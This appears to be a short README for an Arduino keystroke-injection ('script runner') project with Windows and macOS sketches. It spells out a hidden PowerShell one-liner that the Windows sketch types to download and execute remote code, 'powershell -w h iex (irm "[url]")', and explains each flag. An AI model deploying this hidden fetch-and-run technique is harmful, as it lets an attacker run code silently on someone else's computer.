# Script Runner
<br>

**script_runner_win.ino:** Once plugged in, it hits win+r which opens the run menu. Then it types out `powershell -w h iex (irm "[url]")`. Here, `-w h` makes it so the process is ran in a hidden window, `irm "[url]"` sends a request to the url and gets the raw text which is executed by `iex`

<br>

**script_runner_mac.ino:** Once plugged in, it hits cmd+space which opens spotlight. Then it types `Terminal.app` and hits enter to open up the terminal application. 
